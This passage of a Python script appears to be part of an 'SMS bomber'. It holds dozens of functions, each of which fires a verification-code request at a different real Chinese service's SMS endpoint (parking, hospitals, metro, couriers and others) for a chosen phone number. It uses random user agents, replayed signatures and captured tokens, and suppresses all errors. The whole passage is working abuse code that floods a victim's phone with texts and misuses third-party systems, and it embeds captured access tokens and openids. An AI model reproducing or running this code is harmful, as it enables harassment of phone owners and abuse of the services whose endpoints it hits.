            "User-Agent": generate_random_user_agent(),
            "content-type": "application/json",
            "Accept-Encoding": "gzip,compress,br,deflate",
            "Referer": "https://servicewechat.com/wx1db9f853c02f4bd7/60/page-frame.html"
        }
        data = "{\"phone\":\"15915637092\",\"type\":1,\"random\":67,\"sign\":\"21bf8482004d5291ff0c5d04f49561c5\"}"
        data = replace_phone_in_data(data, phone)
        requests.post(url, headers=headers, data=data, timeout=5)
    except:
        pass

def send_sms_46(phone):
    try:
        url = f"https://xtzhtc.cn/acct_security/code/sms?mobile={phone}"
        headers = {
            "Host": "xtzhtc.cn",
            "Connection": "keep-alive",
            "charset": "utf-8",
            "User-Agent": generate_random_user_agent(),
            "content-type": "application/json",
            "Accept-Encoding": "gzip,compress,br,deflate",
            "deviceid": "1765704685811908070",
            "Referer": "https://servicewechat.com/wx7f4189124b248255/50/page-frame.html"
        }
        requests.get(url, headers=headers, timeout=5)
    except:
        pass

def send_sms_47(phone):
    try:
        url = f"https://park.handantingche.com/MobileServer/general/user/getSmsCode?telNo={phone}&smsCodeType=4&codeSendType=0&captchaCode=&captchaSessionId=&appServletRequestType=openid&payAppID=105&sceneType=9&wxlite_token=5dbfcb4c84bf7d5025ec79086305f2e9"
        headers = {
            "User-Agent": generate_random_user_agent(),
            "Accept-Encoding": "gzip, deflate, br"
        }
        requests.get(url, headers=headers, timeout=5)
    except:
        pass

def send_sms_48(phone):
    try:
        url = "https://dlmixc-parking.lncrland.cn/txprod/api/WxLogIn/wx-log-in-verification-code"
        headers = {
            "Host": "dlmixc-parking.lncrland.cn",
            "Connection": "keep-alive",
            "charset": "utf-8",
            "User-Agent": generate_random_user_agent(),
            "content-type": "application/json",
            "Accept-Encoding": "gzip,compress,br,deflate",
            "Referer": "https://servicewechat.com/wx7114ff2622ca3041/7/page-frame.html"
        }
        data = "{\"phonenumber\":\"15915637092\"}"
        data = replace_phone_in_data(data, phone)
        requests.post(url, headers=headers, data=data, timeout=5)
    except:
        pass

def send_sms_49(phone):
    try:
        url = "https://gw.httczx.cn/v1/park/cloud/co/gw"
        headers = {
            "Host": "gw.httczx.cn",
            "Connection": "keep-alive",
            "authorization": "86afccc791ed489c8987be7ae76ae57943",
            "charset": "utf-8",
            "User-Agent": generate_random_user_agent(),
            "content-type": "application/json",
            "Accept-Encoding": "gzip,compress,br,deflate",
            "visitorid": "v_m8ruovibw8m",
            "Referer": "https://servicewechat.com/wxfb869d53f30f2a7f/18/page-frame.html"
        }
        current_ts = get_current_timestamp()
        data = f"{{\"bizReqData\":\"{{\\\"mobile\\\":\\\"{phone}\\\",\\\"purpose\\\":\\\"BIND_MOBILE_AND_OPEN\\\"}}\",\"operation\":\"8818.co.parkcloud.security.sms.send\",\"partnerNo\":\"1618888118\",\"appCode\":\"202304241618888622\",\"source\":\"WX_LITE\",\"timestamp\":\"{current_ts}\",\"sign\":\"2e0e82b4ded22e93db5c48885a4e0cb1\"}}"
        requests.post(url, headers=headers, data=data, timeout=5)
    except:
        pass

def send_sms_50(phone):
    try:
        url = "https://dlmixc-parking.lncrland.cn/syhgwxh-api/1.0/default/send-msg"
        headers = {
            "Host": "dlmixc-parking.lncrland.cn",
            "Connection": "keep-alive",
            "charset": "utf-8",
            "User-Agent": generate_random_user_agent(),
            "content-type": "application/json",
            "Accept-Encoding": "gzip,compress,br,deflate",
            "Referer": "https://servicewechat.com/wx61c81e0c74e1c278/13/page-frame.html"
        }
        data = "{\"phone\":\"15915637092\",\"tempType\":\"ZL\",\"channel\":\"MINI\",\"length\":4}"
        data = replace_phone_in_data(data, phone)
        requests.post(url, headers=headers, data=data, timeout=5)
    except:
        pass

def send_sms_51(phone):
    try:
        url = f"https://tsms1.sctfia.com/captcha_send?phone={phone}"
        headers = {
            "User-Agent": generate_random_user_agent(),
            "Accept-Encoding": "gzip, deflate, br"
        }
        requests.get(url, headers=headers, timeout=5)
    except:
        pass

def send_sms_52(phone):
    try:
        url = "https://php.51jjcx.com/user/Login/sendSMStttt_123"
        headers = {
            "Host": "php.51jjcx.com",
            "Connection": "keep-alive",
            "charset": "utf-8",
            "User-Agent": generate_random_user_agent(),
            "content-type": "application/x-www-form-urlencoded",
            "Accept-Encoding": "gzip,compress,br,deflate",
            "accept": "application/json, text/plain, */*",
            "Referer": "https://servicewechat.com/wxfaa1ea1ef2c2be3f/231/page-frame.html"
        }
        # 保持原始sign不变,只替换手机号
        data = "phone=15915637092&sign=vepMXAyON4Y2iUmCU8kBK00Wp4jnyWK6WSVlCR86oDLEOYyIM0Z%2FqSwWpTG1hxGB7LVvA8OLZqG9FFOaku2X33spidhBYWG%2B8iwX9%2BottphviMiG2JL%2By6zta3bxGrgYOGu8Nmii6VfiVyoU1clid3F7CLodljKhuuY1IVEbOFxSZ16C%2Fcag%2FOy4UUUlzXvsSwFv4K5%2FFLX5QV3GKhtxqF6aEcUqLJquJPDUNq%2GOZZuaRnb%2B%2Bz9wtJvTk%2BHKnDbIUmNuolvqFTOM%2BV7WS0AvUsSCVgKhHoQsUf7Lz2j0kr1PC1X78mPEn82nz8%2BAl6%2FAFSNHDeoknBTzpnNgmrm5OQ%3D%3D"
        data = replace_phone_in_data(data, phone)
        requests.post(url, headers=headers, data=data, timeout=5)
    except:
        pass

def send_sms_53(phone):
    try:
        url = "https://skyclient.shangshuikeji.cn/h5/v1/passenger/user/wx/sendVerifyCode"
        headers = {
            "Host": "skyclient.shangshuikeji.cn",
            "Connection": "keep-alive",
            "charset": "utf-8",
            "User-Agent": generate_random_user_agent(),
            "content-type": "application/json;charset=UTF-8",
            "Accept-Encoding": "gzip,compress,br,deflate",
            "_yy_cid": "100001",
            "Referer": "https://servicewechat.com/wx0f7efcce0dffa575/300/page-frame.html"
        }
        data = "{\"channelId\":\"100001\",\"sdk\":\"3.8.12\",\"deviceModel\":\"V2403A\",\"appversion\":\"release/feat_20251204\",\"pf\":2,\"channel\":\"wechat_applet\",\"openId\":\"o-Fd45UsgFym5ruBA3kcGn_-Hd6c\",\"commonParams\":\"{\\\"sdk\\\":\\\"3.8.12\\\",\\\"deviceModel\\\":\\\"V2403A\\\",\\\"appversion\\\":\\\"release/feat_20251204\\\",\\\"pf\\\":2,\\\"channel\\\":\\\"wechat_applet\\\",\\\"openId\\\":\\\"o-Fd45UsgFym5ruBA3kcGn_-Hd6c\\\"}\",\"mobile\":\"15915637092\"}"
        data = replace_phone_in_data(data, phone)
        requests.post(url, headers=headers, data=data, timeout=5)
    except:
        pass

def send_sms_54(phone):
    try:
        url = f"https://go-api.gljunda.com/user/code/{phone}?mobile={phone}&tenantId=27&codeVerif="
        headers = {
            "User-Agent": generate_random_user_agent(),
            "Accept-Encoding": "gzip, deflate, br"
        }
        requests.get(url, headers=headers, timeout=5)
    except:
        pass

def send_sms_55(phone):
    try:
        url = "https://dzgj.nxycgj.com:18810/api/custom-bus-service/passengerLogin/sendCode"
        headers = {
            "Host": "dzgj.nxycgj.com:18810",
            "Connection": "keep-alive",
            "charset": "utf-8",
            "User-Agent": generate_random_user_agent(),
            "content-type": "application/json",
            "Accept-Encoding": "gzip,compress,br,deflate",
            "Referer": "https://servicewechat.com/wx80b042620522523a/14/page-frame.html"
        }
        current_time = time.strftime("%Y-%m-%d %H:%M:%S", time.localtime())
        data = f"{{\"timestamp\":\"{current_time}\",\"version\":\"2.0.0\",\"clientType\":\"01\",\"merchantId\":\"10000001\",\"data\":{{\"phone\":\"{phone}\"}},\"sign\":\"ZLSicWvhbdAx+LmA2x7um7R6p+DKRFOLWPQINBm9IqzXtz6p8qvc+rGQNQig3/v7ysD2HTOuqiMVQsOt/rP2a8U02CkQ/lqjmsdB5MJSf4RTJHg0M2M/Vcs8otNxkt+BSdDi1vfViXpQmrRTpMz8pyb5pZIC9MPZzICmi+k9B5E=\"}}"
        requests.post(url, headers=headers, data=data, timeout=5)
    except:
        pass

def send_sms_56(phone):
    try:
        url = f"https://mini.shangyubike.com/USER-SERVICE/sms/sendValidCode?mobileNo={phone}&reqType=Regist"
        headers = {
            "User-Agent": generate_random_user_agent(),
            "Accept-Encoding": "gzip, deflate, br"
        }
        requests.get(url, headers=headers, timeout=5)
    except:
        pass

def send_sms_57(phone):
    try:
        url = "https://appdl.zzcyjt.com:60044/api/person/getLoginCode"
        headers = {
            "Host": "appdl.zzcyjt.com:60044",
            "Connection": "keep-alive",
            "charset": "utf-8",
            "User-Agent": generate_random_user_agent(),
            "content-type": "application/json",
            "Accept-Encoding": "gzip,compress,br,deflate",
            "Referer": "https://servicewechat.com/wxba28c1653b77e510/215/page-frame.html"
        }
        data = "{\"phoneNumber\":\"15915637093\"}"
        data = replace_phone_in_data(data, phone)
        requests.post(url, headers=headers, data=data, timeout=5)
    except:
        pass

def send_sms_58(phone):
    try:
        url = "https://load.dingdatech.com/api/uum/security/getVcode"
        headers = {
            "Host": "load.dingdatech.com",
            "Connection": "keep-alive",
            "charset": "utf-8",
            "User-Agent": generate_random_user_agent(),
            "content-type": "application/json",
            "Accept-Encoding": "gzip,compress,br,deflate",
            "Referer": "https://servicewechat.com/wxf7c61a26a092859c/60/page-frame.html"
        }
        data = "{\"appId\":\"mtacf84f3423b0e6132\",\"phoneNO\":\"15915637093\"}"
        data = replace_phone_in_data(data, phone)
        requests.post(url, headers=headers, data=data, timeout=5)
    except:
        pass

def send_sms_59(phone):
    try:
        url = "https://www.xtjfcd.com/api/api-service/api/getCode"
        headers = {
            "Host": "www.xtjfcd.com",
            "Connection": "keep-alive",
            "authorization": "",
            "charset": "utf-8",
            "User-Agent": generate_random_user_agent(),
            "content-type": "application/json",
            "Accept-Encoding": "gzip,compress,br,deflate",
            "Referer": "https://servicewechat.com/wx9fb2b19202fa5717/38/page-frame.html"
        }
        data = "{\"phoneNo\":\"13800000000\",\"sellerNo\":\"xt\",\"type\":\"3\"}"
        data = replace_phone_in_data(data, phone)
        requests.post(url, headers=headers, data=data, timeout=5)
    except:
        pass

def send_sms_60(phone):
    try:
        url = f"https://erp.fjtantu.cn/api/sys/getSmsCode?phone={phone}"
        headers = {
            "Host": "erp.fjtantu.cn",
            "Connection": "keep-alive",
            "charset": "utf-8",
            "User-Agent": generate_random_user_agent(),
            "content-type": "application/json;charset=utf-8",
            "source": "7",
            "Accept-Encoding": "gzip,compress,br,deflate",
            "cache-control": "no-cache",
            "accept-charset": "utf-8",
            "x-access-token": "",
            "Referer": "https://servicewechat.com/wx120464bb36389b2b/25/page-frame.html"
        }
        requests.get(url, headers=headers, timeout=5)
    except:
        pass

def send_sms_61(phone):
    try:
        url = "https://api.yccsparking.com/yccstc-service-api/account/getPin"
        headers = {
            "Host": "api.yccsparking.com",
            "Connection": "keep-alive",
            "charset": "utf-8",
            "User-Agent": generate_random_user_agent(),
            "content-type": "application/json",
            "Accept-Encoding": "gzip,compress,br,deflate",
            "accept": "application/json",
            "Referer": "https://servicewechat.com/wx8c0f477b635e9b93/87/page-frame.html"
        }
        data = "{\"mobilenum\":\"15915637098\",\"pinlength\":6,\"verify_key\":\"\",\"verify_code\":\"\",\"from\":\"3\",\"utoken\":\"\"}"
        data = replace_phone_in_data(data, phone)
        requests.post(url, headers=headers, data=data, timeout=5)
    except:
        pass

def send_sms_62(phone):
    try:
        url = "https://wechat-quanzhou.youbikecn.com/weixin/sms/send"
        headers = {
            "Host": "wechat-quanzhou.youbikecn.com",
            "Connection": "keep-alive",
            "charset": "utf-8",
            "enflag": "1",
            "User-Agent": generate_random_user_agent(),
            "content-type": "application/json;charset=utf-8",
            "Accept-Encoding": "gzip,compress,br,deflate",
            "accept": "application/json, text/plain, */*",
            "Referer": "https://servicewechat.com/wxd37b5a11ac15c5c4/99/page-frame.html"
        }
        current_ts = str(int(time.time()))
        data = f"{{\"account\":\"ABCDABCDFFF\",\"phone\":\"{phone}\",\"timestamp\":\"{current_ts}\",\"sign\":\"a1c825a9e0c5f1683df6131bc3437ed3\"}}"
        requests.post(url, headers=headers, data=data, timeout=5)
    except:
        pass

def send_sms_63(phone):
    try:
        url = "https://www.kyxtpt.com/auth/api/v1/login/sms-valid-code-send"
        headers = {
            "Host": "www.kyxtpt.com",
            "Connection": "keep-alive",
            "charset": "utf-8",
            "User-Agent": generate_random_user_agent(),
            "content-type": "application/json",
            "Accept-Encoding": "gzip,compress,br,deflate",
            "6zubypya": "[object Undefined]",
            "devicetype": "WECHAT",
            "accept": "application/json",
            "Referer": "https://servicewechat.com/wx73fb48c3856b005d/39/page-frame.html"
        }
        data = "{\"loginId\":\"15915637092\"}"
        data = replace_phone_in_data(data, phone)
        requests.post(url, headers=headers, data=data, timeout=5)
    except:
        pass

def send_sms_64(phone):
    try:
        url = "https://xxdz.maiziedu.cn/api/v2/sms/sendRegCode"
        headers = {
            "Host": "xxdz.maiziedu.cn",
            "Connection": "keep-alive",
            "authorization": "Bearer",
            "charset": "utf-8",
            "x-app-platform": "mp-weixin",
            "User-Agent": generate_random_user_agent(),
            "content-type": "application/json",
            "Accept-Encoding": "gzip,compress,br,deflate",
            "x-app-version": "2.0.16",
            "Referer": "https://servicewechat.com/wx7c2d51b59c4fc80c/164/page-frame.html"
        }
        data = "{\"mobile\":\"15915637092\"}"
        data = replace_phone_in_data(data, phone)
        requests.post(url, headers=headers, data=data, timeout=5)
    except:
        pass

def send_sms_65(phone):
    try:
        url = "https://tjcx-server.crcctjyy.cn/his/smsVerification/sendVerification"
        headers = {
            "Host": "tjcx-server.crcctjyy.cn",
            "Connection": "keep-alive",
            "charset": "utf-8",
            "User-Agent": generate_random_user_agent(),
            "content-type": "application/json",
            "Accept-Encoding": "gzip,compress,br,deflate",
            "Referer": "https://servicewechat.com/wx7631fd8e4006598c/2/page-frame.html"
        }
        data = "{\"phoneNumber\":\"15915637092\"}"
        data = replace_phone_in_data(data, phone)
        requests.post(url, headers=headers, data=data, timeout=5)
    except:
        pass

def send_sms_66(phone):
    try:
        url = "https://qcty.crscl.com.cn/crscl-wlgl-app-api/crscl-wlgl-user/cust/custSendAuthCodeRegister"
        headers = {
            "Host": "qcty.crscl.com.cn",
            "Connection": "keep-alive",
            "authorization": "",
            "charset": "utf-8",
            "appsign": "1e6dcc704d2479fb758c8c1fda241a91",
            "User-Agent": generate_random_user_agent(),
            "content-type": "application/json",
            "Accept-Encoding": "gzip,compress,br,deflate",
            "timestamp": get_current_timestamp(),
            "Referer": "https://servicewechat.com/wx2a68df8c778b639b/61/page-frame.html"
        }
        data = "{\"mobileNumber\":\"15915637098\"}"
        data = replace_phone_in_data(data, phone)
        requests.post(url, headers=headers, data=data, timeout=5)
    except:
        pass

def send_sms_67(phone):
    try:
        url = "https://car.sugoio.com/api/sms"
        headers = {
            "Host": "car.sugoio.com",
            "Connection": "keep-alive",
            "charset": "utf-8",
            "x-timestamp": get_current_timestamp(),
            "x-sign": "D0CE9D34028BAF8A062912C97DF6C69E",
            "User-Agent": generate_random_user_agent(),
            "x-device-info": "{}",
            "content-type": "application/json;charset=UTF-8",
            "Accept-Encoding": "gzip,compress,br,deflate",
            "Referer": "https://servicewechat.com/wx2f87036417972db6/61/page-frame.html"
        }
        data = "{\"smsType\":0,\"phone\":\"15915637098\",\"captcha\":\"\",\"agreement\":true,\"loginDevice\":\"5\"}"
        data = replace_phone_in_data(data, phone)
        requests.post(url, headers=headers, data=data, timeout=5)
    except:
        pass

def send_sms_68(phone):
    try:
        url = "https://www.ylt56.com/validate_code.do"
        headers = {
            "Host": "www.ylt56.com",
            "Connection": "keep-alive",
            "charset": "utf-8",
            "User-Agent": generate_random_user_agent(),
            "content-type": "application/x-www-form-urlencoded",
            "Accept-Encoding": "gzip,compress,br,deflate",
            "accept": "application/json",
            "Referer": "https://servicewechat.com/wx8a7568b39073e374/86/page-frame.html"
        }
        data = "phone_num=13800000000"
        data = replace_phone_in_data(data, phone)
        requests.post(url, headers=headers, data=data, timeout=5)
    except:
        pass

def send_sms_69(phone):
    try:
        url = f"https://webhis.stumhc.cn:7443/pbm/getValidationCode.do?validationAccount={phone}&validationType=01"
        headers = {
            "User-Agent": generate_random_user_agent(),
            "Accept-Encoding": "gzip, deflate, br"
        }
        requests.get(url, headers=headers, timeout=5)
    except:
        pass

def send_sms_70(phone):
    try:
        url = "https://sdsjwapi.hos.hantaiinfo.com:18083/api/mini/account/sendVerifyCode"
        headers = {
            "Host": "sdsjwapi.hos.hantaiinfo.com:18083",
            "Connection": "keep-alive",
            "charset": "utf-8",
            "User-Agent": generate_random_user_agent(),
            "content-type": "application/json",
            "Accept-Encoding": "gzip,compress,br,deflate",
            "accept": "application/json",
            "Referer": "https://servicewechat.com/wx6d4061c0d8efe14b/60/page-frame.html"
        }
        data = "{\"phone\":\"15915637096\",\"codeType\":\"3\",\"platformType\":\"4\"}"
        data = replace_phone_in_data(data, phone)
        requests.post(url, headers=headers, data=data, timeout=5)
    except:
        pass

def send_sms_71(phone):
    try:
        url = "https://js.mingyibang.com/api/myapi/getSmsCode"
        headers = {
            "Host": "js.mingyibang.com",
            "Connection": "keep-alive",
            "charset": "utf-8",
            "appid": "wx9fbaca83395fa582",
            "x-token": "",
            "User-Agent": generate_random_user_agent(),
            "content-type": "application/json",
            "Accept-Encoding": "gzip,compress,br,deflate",
            "Referer": "https://servicewechat.com/wx9fbaca83395fa582/4/page-frame.html"
        }
        data = "{\"phone\":\"13800000000\"}"
        data = replace_phone_in_data(data, phone)
        requests.post(url, headers=headers, data=data, timeout=5)
    except:
        pass

def send_sms_72(phone):
    try:
        url = f"https://rihapi.rwjiankang.com/mobile/getRegisterCode?mobile={phone}&thirdEnv=1&userFrom=1"
        headers = {
            "Host": "rihapi.rwjiankang.com",
            "Connection": "keep-alive",
            "charset": "utf-8",
            "thirdenv": "1",
            "User-Agent": generate_random_user_agent(),
            "content-type": "application/json",
            "access-token": "e5a7a15927934fc4b74dbda078b1e490",
            "Accept-Encoding": "gzip,compress,br,deflate",
            "inlet": "ypqjswszx",
            "Referer": "https://servicewechat.com/wxefea52822f229877/2/page-frame.html"
        }
        requests.get(url, headers=headers, timeout=5)
    except:
        pass

def send_sms_73(phone):
    try:
        url = f"https://dingdangyjh.com/mallapi/phone/code?type=1&phone={phone}"
        headers = {
            "User-Agent": generate_random_user_agent(),
            "Accept-Encoding": "gzip, deflate, br"
        }
        requests.get(url, headers=headers, timeout=5)
    except:
        pass

def send_sms_74(phone):
    try:
        url = "https://live-server.yinghecloud.com/api/v1/common/sendPhoneCode"
        headers = {
            "Host": "live-server.yinghecloud.com",
            "Connection": "keep-alive",
            "traceid": "qs41d9522062046b3cfd49e190ee61",
            "charset": "utf-8",
            "role": "10",
            "latitude": "",
            "User-Agent": generate_random_user_agent(),
            "platformid": "yjt",
            "Accept-Encoding": "gzip,compress,br,deflate",
            "version": "1.2.01",
            "platform": "wx-mini",
            "network": "wifi",
            "share_id": "1",
            "authorization": "Bearer",
            "system": "Android 15",
            "model": "V2403A",
            "content-type": "application/json",
            "osversion": "15",
            "loginappid": "10020",
            "brand": "vivo",
            "osname": "android",
            "longitude": "",
            "Referer": "https://servicewechat.com/wx87852a2ac8a9a856/40/page-frame.html"
        }
        data = "{\"phone\":\"13800000000\",\"role\":10,\"type\":7,\"reset\":true}"
        data = replace_phone_in_data(data, phone)
        requests.post(url, headers=headers, data=data, timeout=5)
    except:
        pass

def send_sms_75(phone):
    try:
        url = "https://svip.bgjtsvip.com/api/send_code"
        headers = {
            "Host": "svip.bgjtsvip.com",
            "Connection": "keep-alive",
            "charset": "utf-8",
            "User-Agent": generate_random_user_agent(),
            "merchant-id": "57",
            "content-type": "application/json",
            "Accept-Encoding": "gzip,compress,br,deflate",
            "store-id": "479",
            "token": "",
            "Referer": "https://servicewechat.com/wx7966dac6db63ed45/60/page-frame.html"
        }
        data = "{\"mobile\":\"13800000000\",\"scene\":2}"
        data = replace_phone_in_data(data, phone)
        requests.post(url, headers=headers, data=data, timeout=5)
    except:
        pass

def send_sms_76(phone):
    try:
        url = "https://swoole.86yqy.com/api/user/public/sms"
        headers = {
            "Host": "swoole.86yqy.com",
            "Connection": "keep-alive",
            "access-control-allow-origin": "*",
            "charset": "utf-8",
            "independentsupplierid": "2056920",
            "channel": "buyer_mini_program",
            "User-Agent": generate_random_user_agent(),
            "content-type": "application/json",
            "Accept-Encoding": "gzip,compress,br,deflate",
            "Referer": "https://servicewechat.com/wx84c88e8675dfca9e/18/page-frame.html"
        }
        data = "{\"mobile\":\"13800000000\"}"
        data = replace_phone_in_data(data, phone)
        requests.post(url, headers=headers, data=data, timeout=5)
    except:
        pass

def send_sms_77(phone):
    try:
        url = f"https://app.yae111.com/base/getLoginSms?phone={phone}"
        headers = {
            "User-Agent": generate_random_user_agent(),
            "Accept-Encoding": "gzip, deflate, br"
        }
        requests.get(url, headers=headers, timeout=5)
    except:
        pass

def send_sms_78(phone):
    try:
        url = f"https://api-salus.yaoud.cn/infra/register/getAuthCode/{phone}"
        headers = {
            "User-Agent": generate_random_user_agent(),
            "Accept-Encoding": "gzip, deflate, br"
        }
        requests.get(url, headers=headers, timeout=5)
    except:
        pass

def send_sms_79(phone):
    try:
        url = "https://gdfda.cn/prop-api/app/user/userLogin/view/randomCode/"
        headers = {
            "Host": "gdfda.cn",
            "Connection": "keep-alive",
            "charset": "utf-8",
            "x-requested-with": "XMLHttpRequest",
            "User-Agent": generate_random_user_agent(),
            "content-type": "application/json; charset=UTF-8",
            "Accept-Encoding": "gzip,compress,br,deflate",
            "accept": "application/json",
            "Referer": "https://servicewechat.com/wx9b98e7aed3fe48a6/51/page-frame.html"
        }
        data = "13800000000"
        data = replace_phone_in_data(data, phone)
        requests.post(url, headers=headers, data=data, timeout=5)
    except:
        pass

def send_sms_80(phone):
    try:
        url = "https://srv-uzone.bcpmdata.com/message/send"
        headers = {
            "Host": "srv-uzone.bcpmdata.com",
            "Connection": "keep-alive",
            "bcpm-platform": "miniprogram",
            "charset": "utf-8",
            "app-id": "LkdJdgSm",
            "User-Agent": generate_random_user_agent(),
            "content-type": "application/json",
            "Accept-Encoding": "gzip,compress,br,deflate",
            "platform": "mp-weixin",
            "Referer": "https://servicewechat.com/wx9b8ad01a7a6f82af/119/page-frame.html"
        }
        data = "{\"area_code\":\"86\",\"phone\":\"13800000012\"}"
        data = replace_phone_in_data(data, phone)
        requests.post(url, headers=headers, data=data, timeout=5)
    except:
        pass

def send_sms_81(phone):
    try:
        sign = "4a7d0a4479416fee452e7f0b3b60c09e"
        url = f"https://appapi.ytyymall.com/api/register/sms?phone={phone}&sign={sign}"
        headers = {
            "User-Agent": generate_random_user_agent(),
            "Accept-Encoding": "gzip, deflate, br"
        }
        requests.get(url, headers=headers, timeout=5)
    except:
        pass

def send_sms_82(phone):
    try:
        url = f"https://gcxy8.com/cnexam/miniApi/appUser/officialAccounts/member/registerSendToMobile?phonenumber={phone}"
        headers = {
            "User-Agent": generate_random_user_agent(),
            "Accept-Encoding": "gzip, deflate, br"
        }
        requests.get(url, headers=headers, timeout=5)
    except:
        pass

def send_sms_83(phone):
    try:
        url = "https://api.medlive.cn/v2/user/register/user_open_mobile_code_applet.php"
        cookies = {
            "ymtinfo": "eyJ1aWQiOiIiLCJyZXNvdXJjZSI6Im1pbmlwcm9ncmFtIiwiYXBwX25hbWUyIjoiZHJ1Z19taW5pcHJvZ3JhbSIsImV4dF92ZXJzaW9uIjoiMiIsInVuaW9uaWQiOiIifQ==",
        }
        headers = {
            "Host": "api.medlive.cn",
            "Connection": "keep-alive",
            "authorization": "",
            "charset": "utf-8",
            "User-Agent": generate_random_user_agent(),
            "content-type": "application/x-www-form-urlencoded",
            "Accept-Encoding": "gzip,compress,br,deflate",
            "Referer": "https://servicewechat.com/wxee6b2a17a0ad2720/4/page-frame.html"
        }
        current_ts = str(int(time.time()))
        data = f"mobile={phone}&resource=applet&app_name=drug_applet&timestamp={current_ts}"
        requests.post(url, headers=headers, cookies=cookies, data=data, timeout=5)
    except:
        pass

def send_sms_84(phone):
    """重庆地铁短信接口"""
    try:
        url = "https://ycx.cqmetro.cn/bas/mc/v1/send-sms-code"
        headers = {
            "Host": "ycx.cqmetro.cn",
            "Content-Type": "application/json",
            "signature": "Jsz+LXqnwqX2bghxG7QmumvxMMYXtIu1E3/dgYE7qgLDdgggleV711ATvebklUEWzvppqpKTFxvK4v9uAKwaZQj+xNF4e8LCftuAh2iouphUyJqIz39JMRNS7PxvzfntiC9rh8POX84LLwvYjOzISEB2+eE1+N2+DBENnA3Pfys=",
            "Referer": "https://servicewechat.com/wxa17aea49c17829df/8/page-frame.html"
        }
        data = json.dumps({"mobile_phone": phone, "sms_type": "0"})
        requests.post(url, headers=headers, data=data, timeout=5)
    except:
        pass

def send_sms_85(phone):
    """挂号hao短信接口"""
    try:
        url = "https://168api-tyxcx.zaiguahao.com/api/common/smsSend"
        headers = {
            "Host": "168api-tyxcx.zaiguahao.com",
            "Content-Type": "application/json",
            "openid": "oV6zA6w65irzV1-yy9fI-q2XoQfs"
        }
        data = json.dumps({"applets_id": 1352, "phone": phone})
        requests.post(url, headers=headers, data=data, timeout=5)
    except:
        pass

def send_sms_86(phone):
    """360jdt短信接口"""
    try:
        url = f"https://wxmini.360jdt.cn/prod-api/jd-jdt-api/api/mobile/send?appType=1&mobile={phone}&openId=o8J4U7TFmwklhaNtJR-H9Yu-oryo&tenantId=100017"
        headers = {
            "Host": "wxmini.360jdt.cn",
            "encData": "a56e8c8506e92d2c56e4512bd86578f3c5b56e443051160ac2eda3b668295d54",
            "Referer": "https://wxmini.360jdt.cn/firstCreate?flag=0"
        }
        requests.get(url, headers=headers, timeout=5)
    except:
        pass

def send_sms_87(phone):
    """快递zs短信接口"""
    try:
        url = "https://xcx.kuaidizs.cn/xcx/identity/sendCapcha"
        headers = {
            "Host": "xcx.kuaidizs.cn",
            "Content-Type": "application/json",
            "token": "2da74f341fa94690a8e7318ab8682605oV0yQ4o5tAp-Gkp9tMFJH8YWs1oE"
        }
        data = json.dumps({"phone": phone})
        requests.post(url, headers=headers, data=data, timeout=5)
    except:
        pass

def send_sms_88(phone):
    """快递100短信接口"""
    try:
        url = "https://p.kuaidi100.com/xcx/sms/sendcode"
        headers = {
            "Host": "p.kuaidi100.com",
            "Content-Type": "application/x-www-form-urlencoded",
            "Referer": "https://servicewechat.com/wx1dd3d8b53b02d7cf/553/page-frame.html"
        }
        data = f"name={phone}&validcode="
        requests.post(url, headers=headers, data=data, timeout=5)
    except:
        pass

def send_sms_89(phone):
    """iyouya短信接口(重复接口,保留以保持完整性)"""
    try:
        url = f"https://app-api.iyouya.com/app/memberAccount/captcha?mobile={phone}"
        headers = {
            "User-Agent": generate_random_user_agent(),
            "Accept-Encoding": "gzip, deflate, br"
        }
        requests.get(url, headers=headers, timeout=5)
    except:
        pass

def send_sms_90(phone):
    """101s短信接口"""
    try:
        url = "https://www.101s.com.cn/prod-api/memorial_hall/user/send"
        headers = {
            "Host": "www.101s.com.cn",
            "Content-Type": "application/json",
            "Referer": "https://servicewechat.com/wxff5c9882b5e61d35/9/page-frame.html"
        }
        data = json.dumps({"phone": phone})
        requests.post(url, headers=headers, data=data, timeout=5)
    except:
        pass

def send_sms_91(phone):
    """zzsbzswfwzx短信接口"""
    try:
        url = "https://www.zzsbzswfwzx.cn/zzby/ServerCommand/%E5%8F%91%E9%80%81%E7%9F%AD%E4%BF%A1"
        headers = {
            "Content-Type": "application/json",
            "Referer": "https://www.zzsbzswfwzx.cn/zzby/denglu?openid=ofqJg5BZKdCHk9nLte3JCXDYGupQ"
        }
        data = json.dumps({"Phone": phone})
        requests.post(url, headers=headers, data=data, timeout=5)
    except:
        pass

def send_sms_92(phone):
    """guaguaiot短信接口"""
    try:
        url = "https://ggxy.guaguaiot.com/ggxyapp/app/api/v1/auth/sms/code"
        headers = {
            "Host": "ggxy.guaguaiot.com",
            "Content-Type": "application/json",
            "Referer": "https://servicewechat.com/wx48e0be861389021c/59/page-frame.html"
        }
        data = json.dumps({"mobile": phone, "smsType": 1})
        requests.post(url, headers=headers, data=data, timeout=5)
    except:
        pass

def send_sms_93(phone):
    """xinhualeyu短信接口"""
    try:
        url = f"https://api.xinhualeyu.com/uums/account/sendSms?loginType=1&mobile={phone}&operaType=1"
        headers = {
            "User-Agent": generate_random_user_agent(),
            "Accept-Encoding": "gzip, deflate, br"
        }
        requests.get(url, headers=headers, timeout=5)
    except:
        pass

def send_sms_94(phone):
    """汇总接口 - 不显示内容(异步调用)"""
    try:
        url = f"http://bsyvipapi.com:1314/duanxinhzbsy?sjh={phone}"
        headers = {
            "User-Agent": generate_random_user_agent(),
            "Accept-Encoding": "gzip, deflate, br"
        }
        requests.get(url, headers=headers, timeout=1)  # 超时1秒,不等待响应
    except:
        pass

def send_sms_95(phone):
    """3sd语音接口"""
    try:
        # 随机设备信息
        devices = [
            {"id": "Device-001", "ua": "Mozilla/5.0 (iPhone; CPU iPhone OS 18_6 like Mac OS X) AppleWebKit/605.1.15 Mobile/15E148 MicroMessenger/8.0.64 NetType/WIFI", "vid": "1YbvtfRah70gEcSjXi14q"},
            {"id": "Device-002", "ua": "Mozilla/5.0 (iPhone; CPU iPhone OS 17_4 like Mac OS X) AppleWebKit/605.1.15 Mobile/15E148 MicroMessenger/8.0.60 NetType/5G", "vid": "2ZcvugTbh81hFdTkYj25r"},
            {"id": "Device-003", "ua": "Mozilla/5.0 (Android 14; Mobile; rv:98.0) Gecko/98.0 Firefox/98.0 MicroMessenger/8.0.62 NetType/WIFI", "vid": "3WdwxrUcj92iGeUlZk36s"},
            {"id": "Device-004", "ua": "Mozilla/5.0 (Android 13; Mobile) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/112.0.0.0 Mobile Safari/537.36 MicroMessenger/8.0.58", "vid": "4XehyfVdk03jHfVmXl47t"},
